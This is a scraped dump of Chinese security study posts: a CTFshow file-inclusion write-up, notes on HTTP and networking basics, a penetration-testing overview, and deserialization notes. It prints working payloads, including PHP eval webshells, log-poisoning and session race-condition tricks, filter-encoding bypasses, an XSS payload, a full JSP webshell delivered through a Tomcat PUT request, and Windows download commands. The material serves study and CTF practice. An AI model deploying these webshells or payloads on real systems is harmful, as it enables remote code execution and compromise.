&#125;\n\n这里将php过滤了，我们用不了php伪协议了，同时payload中也不能包含php字段，那就使用data伪协议进行读取和写入：\n\n\n\n3.CTFshow-80、81 日志文件利用\n源码：\n12345678if(isset($_GET[&#x27;file&#x27;]))&#123;      $file = $_GET[&#x27;file&#x27;];      $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);      $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);      include($file);  &#125;else&#123;      highlight_file(__FILE__);  &#125;\n\n可以看到这题将php和data都禁用了，那上面的协议只用file可以用了（不考虑zip等）\n\n但是file只能读取绝对路径的文件，这里我并不知道flag.php的绝对路径，靠猜显然是不可能的\n\n这时候我们就需要用到一些特殊的文件，比如日志文件\n\n为什么呢？因为日志文件很可能会记录我们的访问信息，比如UA头、IP、Cookie等等信息，如果它记录了，那我们是不是可以尝试将php代码写到这些地方，让他包含执行呢？\n\n而且日志文件的绝对路径一般是默认的，但是需要结合搭载的服务器来看：Linux服务器日志存储位置详解：&#x2F;var&#x2F;log&#x2F;、Nginx、Apache、MySQL等常见日志目录 – Linux命令大全(手册)\n\n这里是Nginx，所以我们尝试访问一下Linux下Nginx的默认日志路径：linux 查看nginx日志-CSDN博客\n\n\n可以看到这里呢，是会记录我们的UA头信息的，那我们尝试将php代码放入UA头看它是否执行，直接抓包：\n\n\n然后放包，看日志：\n\n\n可以看到成功执行我们的php代码，然后我们继续读取fl0g.php：\n\n\n成功获得flag\n\n\n4.CTFshow-82 Session&amp;条件竞争\n源码：\n12345678910if(isset($_GET[&#x27;file&#x27;]))&#123;      $file = $_GET[&#x27;file&#x27;];      $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);      $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);      $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);      $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);      include($file);  &#125;else&#123;      highlight_file(__FILE__);  &#125;\n\n现在过滤了php、data、:以及.，所以能够使用的伪协议只有file、zip之类\n\n这题需要通过SESSION来实现文件上传，之后再包含利用\n\n造成利用的原因就是因为PHP中有一个PHP_SESSION_UPLOAD_PROGRESS选项\n\n在了解该选项之前，我们需要知道两个东西：\n\nSession存储位置：\n\n\n与Session有关的几个PHP选项：\n\n\n\n\n然后，我们在了解一个PHP中的PHP_SESSION_UPLOAD_PROGRESS选项，简单来说就是可以通过这个选项让服务器保存我们自定义的SESSION会话文件\n\n但是由于上述条件，保存的内容会被立刻清除，和我们文件上传时一样，它是先上传再清除的，所以存在一个时间间隙我们可以利用\n\n于是我们可以写这样一个html代码：\n12345678910&lt;!doctype html&gt;    &lt;html&gt;    &lt;body&gt;        &lt;form action=&quot;http://xxx.ctf.show/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;            &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;&lt;?php system(&#x27;ls&#x27;);?&gt;&#x27;)?&gt;&quot; /&gt;            &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;              &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;        &lt;/form&gt;    &lt;/body&gt;    &lt;/html&gt;\n\n这个代码就是去上传一个SESSION，然后里面的内容就是当这个SESSION文件被访问时，就创建一个shell.php后门\n\n然后把他搭载到本地，抓包，自定义PHPSESSID，然后放入Intruder模块不断放包：\n\n\n\n这里弄好之后，我们进入ctfshow那里访问sess_lingaaa文件，这个路径一般是默认路径（上面提到过）：\n\n\n看到空白页面，没有保存就说明成功创建了sess_lingaaa文件，但是这里内容是空的，说明内容被删除了\n\n所以我们要持续的访问，在他还没删除的时候访问到，这样就可以创造shell.php了，这里同样用bp进行持续访问\n\n\n最后访问shell.php即可，更详细的文章：ctfshow-web入门-文件包含（web82-web86）条件竞争实现session会话文件包含_ctfshow web82-CSDN博客\n\n\n5.CTFshow-87 php:&#x2F;&#x2F;filter&#x2F;write&amp;加密编码\n源码：\n12345678910111213if(isset($_GET[&#x27;file&#x27;]))&#123;      $file = $_GET[&#x27;file&#x27;];      $content = $_POST[&#x27;content&#x27;];      $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);      $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);      $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);      $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);      file_put_contents(urldecode($file), &quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;.$content);      &#125;else&#123;      highlight_file(__FILE__);  &#125;\n\n过滤了很多东西，然后file也比较难用，基本读不了有后缀的文件，那日志包含不行，Session应该可以，但是也难用\n\n我们注意到这里有个file_put_contents()函数和urldecode($file)函数\n\n出现这两个函数我们就要注意了，第一个函数我们就可以使用php://filter/write去写入内容，第二个函数我们可以去绕过禁止php字段出现\n\n我们知道如果我们GET传入的参数值是经过URL编码的，那么浏览器就会帮我们自动解码一次\n\n但是第二个函数的出现，就会让服务器再帮我们解码一次，因此我们本地可以传入两次URL编码的payload，这样浏览器解码后还是URL编码的值，绕过黑名单检测，服务器再解码一次就是我们真正写入的值了\n\n同时，我们也需要注意这里有个die()函数需要绕过，不然我们就没法执行传入的content\n\n所以我们的payload为php://filter/write=convert.base64-decode/resource=1.php：\n\n\n然后POST传入content，这里需要将php语句进行base64编码，需要注意的是：\n\n编码后的字节数要符合要求，否则会报错：\n编码中不能出现+号，否则上传成功也无法执行\n\n\n那我们content内容就为：&lt;?php @eval($_POST[a]);?&gt;，然后Base64编码：\n\n\n前面加上两个a是为了凑够字节数，然后访问1.php，传入a=system(&#39;ls&#39;);：\n\n\n接下来就可以看flag了：\n\n\n除了上述的使用Base64进行编码以外，还可以使用ROT13进行加密传输\n\npayload为php://filter/write=string.rot13/resource=2.php两次URL编码，content的值为ROT13编码后的一句话木马\n\n\n\n\n6.CTFshow-88\n源码\n123456789if(isset($_GET[&#x27;file&#x27;]))&#123;      $file = $_GET[&#x27;file&#x27;];      if(preg_match(&quot;/php|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\-|\\_|\\+|\\=|\\i&quot;, $file))&#123;          die(&quot;error&quot;);      &#125;      include($file);  &#125;else&#123;      highlight_file(__FILE__);  &#125;\n\n这里过滤了php以及一堆符号，但是没过滤data，所以尝试用data伪协议去执行代码\n\n尝试使用payload为：data://text,plaintext;base64,PD9waHAgc3lzdGVtKCdscycpOz8+，这是不行的，因为里面包含了字符+，会被过滤\n\n所以这里base64编码的值不能包含符号，那就在左右添加值来生成一个没有符号的base64编码\n\n最终我们生成的payload为data:&#x2F;&#x2F;text&#x2F;plain;base64,YWE8P3BocCBzeXN0ZW0oJ2xzJyk7Pz4xMjM0NTU，即aa123455和12成功绕过\n\n\n\n7.CTFshow-117 php:&#x2F;&#x2F;filter&#x2F;write&amp;新的算法\n源码：\n1234567891011highlight_file(__FILE__);  error_reporting(0);  function filter($x)&#123;      if(preg_match(&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;,$x))&#123;          die(&#x27;too young too simple sometimes naive!&#x27;);      &#125;  &#125;  $file=$_GET[&#x27;file&#x27;];  $contents=$_POST[&#x27;contents&#x27;];  filter($file);  file_put_contents($file, &quot;&lt;?php die();?&gt;&quot;.$contents);\n\n这关过滤了很多东西，甚至连base64和rot13都过滤了，而且还有个die()函数需要绕过，那基本上只能加密这些了，但是没过滤php，所以可以使用php伪协议\n\n我们还有一种php伪协议的过滤器convert.iconv.*，详见：php:&#x2F;&#x2F;filter的各种过滤器_php过滤器转换器常见-CSDN博客\n\n这里可以把content的内容从UCS-2LE编码转换为UCS-2BE编码，绕过过滤和die()函数\n\n写一个脚本将contents的内容转一下：\n12$result = iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;, &#x27;$contents&#x27;);echo $result;\n\n所以payload为：php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=1.php，contents=?&lt;hp pvela$(P_SO[T]a;)&gt;?：\n\n\n成功执行，然后直接看flag： \n\n\n\n","slug":"网安知识点","date":"2025-08-11T08:00:00.000Z","categories_index":"网安基础","tags_index":"Web安全","author_index":"归尘aliez"},{"id":"c0dee51911d3712eb1635eee342507ff","title":"系统内容","content":"网安系统内容一.请求头、响应头url: URL (Uniform Resource Locator) 是互联网上用于标识和定位资源的字符串，由多个部分组成，每个部分都有特定的字符使用规则。 \n 一个完整的 URL 通常包含以下部分,示例:\n12#协议://用户名:密码@子域名.域名.顶级域名:端口号/路径/文件名?查询参数#片段标识符https://john:pass123@www.example.com:8080/path/to/file.html?name=value&amp;age=25#section1\n\n不能直接在url里使用的字符：\n1: / ? # [ ] @ ! $ &amp; &#x27; ( ) * + , ; =\n\n\n\n1.请求方式1.1主要请求方式\n\n\n请求方式\n说明\n典型场景\n\n\n\nget\n获取资源，url字符向请求资源发送参数，url记录在历史记录和web服务器的访问日志\n页面加载、搜索查询\n\n\npost\n提交资源(创建&#x2F;修改)，url字符和消息主体中发送请求参数\n登录、表单提交、文件上传\n\n\nput\n向服务器上传资源，完整更新资源（替换全部内容）,可以通过上传脚本攻击程序\nREST API中的资源更新\n\n\npatch\n部分更新资源（仅修改指定字段）\n用户资料局部修改\n\n\nhead\n与get相似，仅获取响应头（不返回Body）\n检查资源是否存在或是否修改\n\n\n1.2特殊请求方式\n\n\n请求方式\n用途\n\n\n\noptions\n获取服务器支持的通信选项（CORS预检请求）\n\n\ntrace\n用于诊断，检测客户端服务器之间是否有代理服务器\n\n\n2.请求头2.1通用头部\n\n\n请求头\n作用说明\n\n\n\nAccept\n向服务器声明可接受的响应类型（如text/html, application/json）\n\n\nAccept-Encoding\n告诉服务器，客户端能接受哪些内容编码、支持的压缩算法\n\n\nHost\n目标域名（HTTP&#x2F;1.1必需字段）：指定请求的url的主机名称\n\n\nUser-Agent\n客户端标识：提供客户端软件信息，通过什么工具访问\n\n\nConnection\n控制连接状态（keep-alive或close）\n\n\nAccept-Language\n浏览器语言\n\n\nReferer\n发出请求的原始URL\n\n\nOrigin\n指示提出请求的域\n\n\n2.2安全相关头部\n\n\n请求头\n作用说明\n\n\n\nAuthorization\n认证凭证，内置HTTP身份验证向服务器提交证书\n\n\ncookie\n会话标识：向服务器提交以前发布的cookie，记录登录信息\n\n\nUpgrade-lnsecure-Requests\n自动升级请求从http到https\n\n\nX_FORWARDED_FOR\n客户端原始IP(可伪造，需谨慎信任),是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端,HTTP请求头字段  格式：请求客户端IP，代理服务器IP\n\n\nX-CSRF-Token\n防御CSRF攻击的令牌\n\n\nContent-Security-Policy\n控制资源加载策略（防御XSS）\n\n\n2.3条件请求头部\n\n\n请求头\n作用说明\n\n\n\nIf-Modified-Since\n资源未修改时返回304（缓存控制）浏览器最后一次收到请求资源的时间\n\n\nIf-None-Match\n基于ETag的缓存验证实体标签，服务器可用实体标签确定浏览器是否使用资源的缓存副本\n\n\n3.响应状态码\n\n\n响应状态码\n状态说明\n\n\n\n100 Continue\n已收到消息头，客户端继续发主体\n\n\n200 OK\n提交成功并已响应主体请求\n\n\n201 Created\n成功提交PUT请求后响应的回复\n\n\n301 Moved Permanently\n永久重定向到另一个消息头\n\n\n302 Found\n暂时重定向到另一消息头，随后就恢复使用原来url\n\n\n304 Not Modified\n使用缓存中保存的所请求资源,确定是否有最新版本资源\n\n\n400 Bad Request\n提交无效HTTP请求，如：url中多了个空格\n\n\n401 Unautorized\n请求前要求HTTP身份验证，消息头中有允许身份类型\n\n\n403 Forbidden\n禁止任何人访问被请求的资源，权限不够\n\n\n404 Not Found\n请求资源不存在\n\n\n405 Method Not Allowed\n指定URL不支持请求使用方法\n\n\n413 Request Entity Took Large\n请求的主体过长\n\n\n414 Request URL Too Long\n请求的URL过长\n\n\n500 Internal Server Error\n执行请求错误，检查服务器响应内容，了解错误详情\n\n\n503 Service Unavailable\nweb正常运转响应，但无法响应访问的应用程序，核查是否执行某行为导致\n\n\n\n1xx -服务器接受浏览器消息未完成  \n2xx—请求被成功提交。 \n3xx—客户端被重定向到其他资源。  \n4xx -客户端错误  \n5xx—服务器错误\n\n4.get与post的区别：\n\n\n维度\nget\npost\n\n\n\n语义\n一般用于请求获取资源，\n一般用于提交数据到后台时使用\n\n\n回退影响\n请求刷新浏览器或回退时没有影响\n回退时会重新提交数据请求\n\n\n缓存\n可被缓存\n默认不被缓存\n\n\n历史记录\n保留在浏览器历史记录中\n不会保留在浏览器历史记录中\n\n\n编码方式\n只能进行url编码\n支持多种编码方式\n\n\n数据存放\n数据放在请求url中，涉及到&#x3D;&#x3D;url加密\n数据放在请求主体中，不会涉及到url加密\n\n\n5.cookie和session的区别\n\n\n维度\ncookie\nsession\n\n\n\n数据存放位置不同\n客户端(浏览器)\n服务器(内存&#x2F;数据库&#x2F;文件)\n\n\n数据安全性\n较低,可直接修改Cookie值进行欺骗\n较安全,仅能修改Session ID（需破解）\n\n\n数据存储类型大小\n仅字符串（最大4KB）一个站点最多保存20个  明文保存\n任意类型（对象、数组等），加密字符串\n\n\n通信方式\n每次请求自动携带（HTTP头）\n通过Session ID关联（通常存于Cookie）\n\n\n性能使用程度不同\nsession会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的内存,考虑到减轻服务器性能方面，应当使用cookie。\n\n\n\n5.1 cookie端：1234567# 服务端设置CookieHTTP/1.1 200 OKSet-Cookie: user_id=123; Expires=Wed, 21 Oct 2025 07:28:00 GMT; Secure; HttpOnly# 客户端发送CookieGET /home HTTP/1.1Cookie: user_id=123\n\n\n\n5.2 cookie与session工作流程：123456sequenceDiagram    Client-&gt;&gt;Server: 访问/login    Server-&gt;&gt;Server: 创建Session(用户数据)    Server-&gt;&gt;Client: Set-Cookie: SESSIONID=abc123    Client-&gt;&gt;Server: Cookie: SESSIONID=abc123    Server-&gt;&gt;Server: 根据abc123查找Session\n\n6.token令牌token：随机字符串，进行CSRF攻击防范的\ntoken的安全问题：token重放攻击、token有效性不能太久(一般1小时左右)、关闭浏览器要让token失效\n\nToken重放攻击‌：是指攻击者拦截并重放有效的Token，以冒充合法用户进行非法操作。\n\n二、Windows与Linux1. HTTP与HTTPS的区别HTTP是超文本传输协议，信息以明文进行传输\nHTTPS是超文本安全传输协议，需要进行SSL加密传输协议，HTTPS需要获得CA的证书，通常需要付费，免费的较少\n2. GBK和UTF-8区别GBK是中文编码字符集 \nutf-8是一种全球通用的字符集\n\n\n\n维度\nGBK\nUTF-8\n\n\n\n覆盖范围\n主要支持中文（简体+繁体）\n支持全球所有语言\n\n\n编码单元\n双字节（部分字符用2字节）\n1-4字节\n\n\n兼容性\n兼容GB2312，不兼容ASCII\n完全兼容ASCII\n\n\n字节序\n大端序（Big-Endian）\n无字节序问题（自同步编码）\n\n\n应用场景\n很少，如：Windows XP默认编码、POS机、工业控制系统\n很广，现在基本都是\n\n\n安全性\n不安全，如：宽字节注入（如%df&#39;被解析为汉字）\n较安全，标准化程度高\n\n\n3. Windows cmd如何下载文件\ncertutil.exe：备份证书\npowershell：powershell curl -o “输出的文件名” “下载的url”\nbitsadmin\nvbs \nftp\n\n4. 如何判断目标主机是Windows还是Linux：\nWindows对大小写不敏感，Linux区分大小写。\n通过ping的TTL值进行判断，TTL值240-255是Linux系统，TTL值100-130为Windows系统\n\n5. Windows 和 Linux 的日志文件放在哪里\nWindows 存放在 C:\\Windows\\System32\\winevt\\Logs\nLinux 日志文件通常保存在/var/log 目录\n\n三、网络通信1.OSI七层协议\n\n\n层级\n层级的相关协议和应用\n\n\n\n物理层\n信号转换的问题\n\n\n数据链路层\nMac地址\n\n\n网络层\nip地址\n\n\n传输层\ntcp&#x2F;udp协议\n\n\n会话层\n会话层负责在数据传输中设置和维护计算机网络中两台计算机之间的通信连接\n\n\n表达层\n表达层把数据转换为能与接收者的系统格式兼容并适合传输的格式。\n\n\n应用层\n协议\n\n\n2.TCP与UDP协议TCP和UDP都是传输层协议\n\nTCP 是一种面向有连接的传输层协议，能够对自己提供的连接实施控制。适用于要求可靠传输的应用，例如文件传输。面向字节流，传输慢 （可靠性，实时，效率低）\nUDP 是一种面向无连接的传输层协议，不会对自己提供的连接实施控制。适用于实时应用，例如：IP电话、视频会议、直播等。以报文的方式传输，效率高 （不可靠，效率低）\n\n3.TCP的三次握手过程4.TCP的四次挥手过程5.PHP协议\nHTTP(超文本传输协议)：用于在万维网上传输数据，主要用于网站和Web服务。\nHTTPS(安全超文本传输协议)：HTTP的加密版本，提供安全的数据传输。\nFTP(文件传输协议)：用于在计算机之间传输文件。\nSMTP(简单邮件传输协议)：用于发送电子邮件。\nIMAP(互联网邮件访问协议)：用于检索电子邮件。\n\n四、数据库(1)mysqldump数据库备份:\n(2)mysql数据库5.0和5.0后的区别\n(3)mysql和sqlserver 有什么相似 \n(4)mysql mssql oracle的区别，怎么判断是哪种数据库  \n","slug":"系统内容","date":"2025-07-22T14:00:00.000Z","categories_index":"网安基础","tags_index":"Web安全","author_index":"归尘aliez"},{"id":"8078ed964e83057be24c1271b3514329","title":"渗透测试基础","content":"渗透测试一、什么是渗透测试？渗透测试（Penetration Testing，简称“渗透测试”或“PenTest”）是一种模拟攻击的安全评估方法，旨在发现系统、网络或应用程序中的安全漏洞，并评估其可能被利用的风险。渗透测试的核心目标是帮助组织识别和修复潜在的安全问题，从而提升整体安全性。\n渗透测试通常由安全专家（白帽黑客）执行，他们会模拟真实攻击者的行为，但不会对系统造成实际损害。渗透测试的结果会形成详细的报告，帮助组织了解其安全状况并采取改进措施。\n\n二、渗透测试的步骤流程渗透测试通常遵循一个标准化的流程，常见的是 PTES（Penetration Testing Execution Standard） 框架，主要包括以下步骤：\n1. 前期交互（Pre-engagement Interactions）\n确定范围：明确测试的目标（如 Web 应用、网络设备、移动应用等）和范围（如 IP 地址、域名、特定功能）。\n制定规则：确定测试的时间、方法、工具和限制条件（如是否允许社会工程攻击、是否允许 DoS 攻击）。\n签署协议：确保双方对测试内容、责任和法律问题达成一致。\n\n2. 信息收集（Information Gathering）\n被动信息收集：通过公开渠道（如搜索引擎、社交媒体、WHOIS 查询）收集目标信息。\n主动信息收集：通过扫描工具（如 Nmap、Masscan）获取目标的 IP 地址、开放端口、服务版本等信息。\n枚举：收集目标系统的详细信息，如用户账户、目录结构、配置文件等。\n\n3. 威胁建模（Threat Modeling）\n识别资产：确定目标系统中的关键资产（如数据库、敏感文件）。\n分析威胁：评估可能的攻击路径和威胁来源（如外部攻击者、内部人员）。\n优先级排序：根据威胁的严重性和可能性，确定测试的重点。\n\n4. 漏洞分析（Vulnerability Analysis）\n自动化扫描：使用漏洞扫描工具（如 Nessus、OpenVAS）检测已知漏洞。\n手动分析：结合经验和工具，深入分析潜在的漏洞（如逻辑漏洞、配置错误）。\n验证漏洞：确认漏洞是否真实存在，并评估其可利用性。\n\n5. 漏洞利用（Exploitation）\n尝试利用漏洞：使用工具（如 Metasploit、Burp Suite）或手动方法尝试利用漏洞。\n权限提升：在成功利用漏洞后，尝试获取更高权限（如从普通用户提升到管理员）。\n横向移动：在目标网络内进一步渗透，获取更多系统的控制权。\n\n6. 后渗透测试（Post-Exploitation）\n维持访问：测试是否可以在目标系统中建立持久性访问（如后门、计划任务）。\n数据收集：收集目标系统中的敏感信息（如数据库、配置文件）。\n清理痕迹：清理测试过程中留下的日志和文件，避免影响目标系统。\n\n7. 报告编写（Reporting）\n详细记录：将测试过程、发现的问题、利用的漏洞和获取的权限详细记录下来。\n风险评估：评估漏洞的严重性和对业务的影响。\n修复建议：提供具体的修复建议和最佳实践。\n\n\n三、渗透测试报告渗透测试报告是渗透测试的最终成果，通常包括以下内容：\n1. 概述（Executive Summary）\n测试目标：说明测试的范围和目标。\n测试结果：简要描述发现的主要问题和风险。\n风险评估：从业务角度评估整体风险。\n\n2. 技术细节（Technical Details）\n漏洞列表：列出所有发现的漏洞，包括漏洞名称、描述、严重等级（如 CVSS 评分）。\n漏洞利用过程：详细描述漏洞的利用步骤，包括使用的工具和方法。\n截图和日志：提供漏洞利用的截图和相关日志，便于复现和验证。\n\n3. 修复建议（Remediation Recommendations）\n具体修复措施：针对每个漏洞提供具体的修复建议（如更新补丁、修改配置）。\n最佳实践：提供长期的安全改进建议（如加强访问控制、定期安全审计）。\n\n4. 附录（Appendix）\n工具列表：列出测试过程中使用的工具。\n参考资料：提供相关的技术文档、漏洞数据库链接等。\n\n\n四、渗透测试的类型根据测试的范围和目标，渗透测试可以分为以下几种类型：\n\n黑盒测试：测试者对目标系统一无所知，模拟外部攻击者的行为。\n白盒测试：测试者拥有目标系统的完整信息，模拟内部攻击者的行为。\n灰盒测试：测试者拥有部分信息，介于黑盒和白盒之间。\n\n\n总结渗透测试是网络安全的重要组成部分，通过模拟攻击帮助组织发现和修复漏洞。其标准流程包括前期交互、信息收集、威胁建模、漏洞分析、漏洞利用、后渗透测试和报告编写。渗透测试报告是测试的最终成果，应包含概述、技术细节、修复建议和附录等内容。通过定期进行渗透测试，组织可以有效提升其安全防护能力。\n","slug":"渗透测试","date":"2025-07-22T13:00:00.000Z","categories_index":"渗透基础","tags_index":"渗透","author_index":"归尘aliez"},{"id":"9481c28de8022105da3986b737672c94","title":"反序列化漏洞","content":"反序列化漏洞 未对反序列化的输入数据做合法性校验，导致攻击者可以控制反序列化的内容。 \n&lt;一&gt;序列化serialize() 将对象（内存中的数据结构或状态）转换为可存储或传输的格式（字节流、JSON、XML等）。 \n1234567891011121314151617class S&#123;    public $test=&quot;pikachu&quot;;&#125;$se=new S(); //创建一个对象serialize($se); //把这个对象进行序列化序列化后得到的结果是这个样子的:O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;    O:代表object    1:代表对象名字长度为一个字符    S:对象的名称    1:代表对象里面有一个变量    s:数据类型    4:变量名称的长度    test:变量名称    s:数据类型    7:变量值的长度    pikachu:变量值\n\n&lt;二&gt;反序列化unserialize()就是将序列化后的数据还原为原始对象。然后在接下来的代码中继续使用。\n123$u=unserialize(&quot;O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;&quot;);echo $u-&gt;test; //得到的结果为pikachu\n\n序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题\n123456789101112131415161718192021222324常见的几个魔法函数:__construct()当一个对象创建时被调用__destruct()当一个对象销毁时被调用__toString()当一个对象被当作一个字符串使用__sleep() 在对象在被序列化之前运行__wakeup将在序列化之后立即被调用漏洞举例:class S&#123;    var $test = &quot;pikachu&quot;;    function __destruct()&#123;        echo $this-&gt;test;    &#125;&#125;$s = $_GET[&#x27;test&#x27;];@$unser = unserialize($a);payload:O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;&#125;\n\n\n\n1.thinkphp反序列化用户参数可控，在序列化的时候加入了攻击代码，反序列化的时候没有做安全过滤等机制，导致了参数进入服务器并且魔法函数自动调用导致攻击。\n1用户参数（实体对象）----序列化（打包）----&gt;序列化字符串------反序列化（拆包）-----&gt;转为实体对象\n\n&lt;三&gt;php反序列化魔法函数：\n\n\n\n\n\n\n\n_construct()：创建对象时自动调用\n_destruct()：销毁对象时自动调用\n\n\n_get()：读取不可访问属性时，被调用\n_toString()：对象被当作字符串时调用\n\n\n_sleep()：对象被序列化前调用\n_wakeup()：对象被序列化后调用\n\n\n_call()：调用不可访问方法时，_call()会被调用\n\n\n\n一、中间件反序列化漏洞1.jboss反序列化JBoss 5.x&#x2F;6.x 反序列化漏洞  \n该漏洞利用了 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化 。\nHttpInvoker 是 JBoss（WildFly）提供的一个远程调用（RPC）框架，允许客户端通过 HTTP 协议 调用服务器端的 Java 方法（类似 Java RMI，但基于 HTTP）。其核心特点包括：\n\n基于序列化：通过 Java 对象序列化传输数据\n\nReadOnlyAccessFilter  是 JBoss HttpInvoker 的一个安全过滤器，主要用于：\n\n限制远程调用的权限：确保只有 只读操作（如查询）能被执行，阻止 写操作（如修改配置、执行命令）。\n防御恶意调用：防止攻击者通过 HttpInvoker 接口执行危险操作（如反序列化攻击、未授权访问）。\n\n2.WebLogic反序列化WebLogic 服务在反序列化数据时未进行安全校验，攻击者可构造恶意序列化数据，WebLogic 自动反序列化数据，执行恶意脚本或命令\nWeblogic 常见漏洞有那些：\n\n弱口令\n反序列化漏洞（CVE-2019-2725 ）\n任意文件上传漏洞操作（CVE-2018-2894）\nSSRF 漏洞（需要安装Weblogic时选择UDDI组件）\n\n3.tomcat反序列化CVE-2017-12615是Apache Tomcat中的一个高危漏洞  \nTomcat运行在Windows操作系统上，并启用了**HTTP PUT请求方法时，攻击者可以通过构造PUT请求，在服务器上任意写入文件。这种漏洞允许攻击者上传JSP文件**到服务器，再使用木马连接工具操控对方服务器\n123456789101112131415161718192021222324252627282930313233PUT /xx.jsp/ HTTP/1.1HOST: *****User-Agent: ******........--------------------------------请求体xx.jsp木马内容，密码passwd-----------------------------&lt;%!    class U extends ClassLoader &#123;        U(ClassLoader c) &#123;            super(c);        &#125;        public Class g(byte[] b) &#123;            return super.defineClass(b, 0, b.length);        &#125;    &#125;     public byte[] base64Decode(String str) throws Exception &#123;        try &#123;            Class clazz = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);            return (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);        &#125; catch (Exception e) &#123;            Class clazz = Class.forName(&quot;java.util.Base64&quot;);            Object decoder = clazz.getMethod(&quot;getDecoder&quot;).invoke(null);            return (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);        &#125;    &#125;%&gt;&lt;%    String cls = request.getParameter(&quot;passwd&quot;);    if (cls != null) &#123;        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);    &#125;%&gt;\n\n\n\n二、框架漏洞反序列化&lt;一&gt;  JNDIJNDI全称为Java命名和目录接口。我们可以理解为JNDI提供了两个服务，即命名服务和目录服务。  \n&lt;二&gt;  RMIRMI（Remote Method Invocation）远程方法调用，是专为Java环境设计的远程方法调用机制，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法。\n&lt;三&gt; lookup函数如果lookup参数可控的话，那么我们就可以传入恶意的url地址来控制受害者加载攻击者指定的恶意类。当我们指定一个恶意的URL地址之后，受害者在获取完这个远程对象之后，开始调用恶意方法。但是在RMI中，调用远程方法，最终的执行是服务端去执行。只是把最终的结果以序列化的形式传递给客户端，也就是这里所说的受害者。当然，如果受害者内部存在漏洞组件存在反序列化漏洞的话，我们可以构造恶意的序列化对象，返回给客户端，当客户端在进行反序列化的时候，可以触发漏洞；如果目标组件不存在反序列化漏洞，我们返回一个恶意对象，但是客户端本地没有这个class文件，当然也就不能成功获取到这个对象。\n&lt;四&gt;  LADPLDAP是轻型目录访问协议的缩写，是一种用于访问和维护分层目录信息的协议。\n1.shiro550反序列化Apache Shiro 1.4.2之前版本中存在安全漏洞。当Apache Shiro使用了默认的‘记住我’配置时，攻击者可利用该漏洞对cookies实施填充攻击。 \n1.原理：shiro默认使用了Cookie RememberMe Manager，其处理cookie（值）的流程（反序列化过程）是：\n得到rememberMe（参数）的cookie值 –-&gt; Base64解码 –-&gt; AES解密 –-&gt;反序列化 \n然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。，最终实现远程代码执行（RCE） \n2.相关知识\nCookie 值本身是加密后的数据 \nAES硬编码 指在代码或配置中直接明文写入 AES加密算法的密钥（Key）或初始化向量（IV），例如：\n\n123// 硬编码示例（不安全！）String key = &quot;0123456789ABCDEF0123456789ABCDEF&quot;; // 32字节密钥（AES-256）byte[] iv = &quot;1234567890ABCDEF&quot;.getBytes();       // 16字节IV\n\n 这种方式将敏感信息（密钥）直接暴露在源码中，而非通过安全方式（如密钥管理系统、环境变量）动态获取。\n3.判断：1.数据返回包中包含 rememberMe&#x3D;deleteMe 字段。 \n2.直接发送原数据包，返回的数据中不存在关键字可以通过在发送数据包的 cookie 中增加字段：**rememberMe&#x3D;**然后查看返回数据包中是否存在关键字。   \n2.fastjson反序列化fastjson是阿里巴巴的开源JSON解析库，fastjson的主要功能就是将Java Bean序列化成JSON字符串，这样得到字符串之后就可以通过数据库等方式进行持久化了。  \nJSON字符串中多出了一个@type字段，使用SerializerFeature.WriteClassName  标注了类对应的原始类型，方便在反序列化的时候定位到具体类型，这个就是AutoType，和引入AutoType的原因。  \n1.1 原理：fastjson在解析json的过程中,支持使用**@type字段来指定反序列化的类型,并调用该类的set&#x2F;get方法来访问属性,当组件开启了autotype功能**并且反序列化不可信数据时,攻击者可以构造数据,\n使目标应用的代码执行流程进入特定类的特定setter或者getter方法中,即可构造出一些恶意利用链。\n1.2 指纹特征：(1) 根据返回包判断 任意抓个包，提交方式改为POST，花括号不闭合。返回包在就会出现fastjson字样。当然这个可以屏蔽！\n(2)利用DNSlog盲打 构造以下payload，利用dnslog平台接收\n1&#123;&quot;zeo&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;\n\n(3) Java站并且传的数据是JSON格式的都可以尝试\n(4) 指纹扫描检测\n1.3 漏洞利用Fastjson 漏洞依赖特定类的属性和方法，经典利用链包括：\n\nJdbcRowSetImpl + JNDI 注入（CVE-2017-18349、cnvd_2019_22238  